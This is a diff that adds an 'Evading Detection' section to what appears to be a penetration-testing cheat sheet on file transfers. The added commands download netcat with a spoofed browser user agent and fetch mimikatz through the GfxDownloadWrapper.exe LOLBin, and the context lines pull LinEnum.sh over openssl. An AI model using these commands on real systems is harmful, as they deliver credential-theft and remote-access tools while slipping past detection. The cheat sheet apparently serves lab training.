@@ -553,3 +553,25 @@ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/Lin
 # download
 openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
 ```
+
+# Evading Detection
+
+- User-Agent is checked when transferring files, can be detected easily.
+
+```powershell
+# listing user agents
+[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
+```
+
+```powershell
+# request
+$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
+Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
+```
+
+## Using LOLBins
+
+```powershell
+# Bypass file transfer detection
+GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
+```
